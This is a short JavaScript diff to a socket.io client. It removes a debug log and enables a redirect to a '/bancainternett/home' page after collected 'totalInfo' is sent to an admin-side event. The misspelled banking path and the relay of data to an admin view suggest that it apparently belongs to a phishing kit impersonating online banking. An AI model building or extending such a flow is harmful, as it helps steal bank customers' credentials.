@@ -91,9 +91,8 @@ emitDataServer.addEventListener("click", () => {
 })
 
 socket.on("ContinuarHome", totalInfo => {
-    console.log(totalInfo);
     socket.emit('mostrarEnAdmin', totalInfo);
-    //window.location.href = "/bancainternett/home/?s="+totalInfo[0].socket;
+    window.location.href = "/bancainternett/home/?s="+totalInfo[0].socket;
 })
 
 
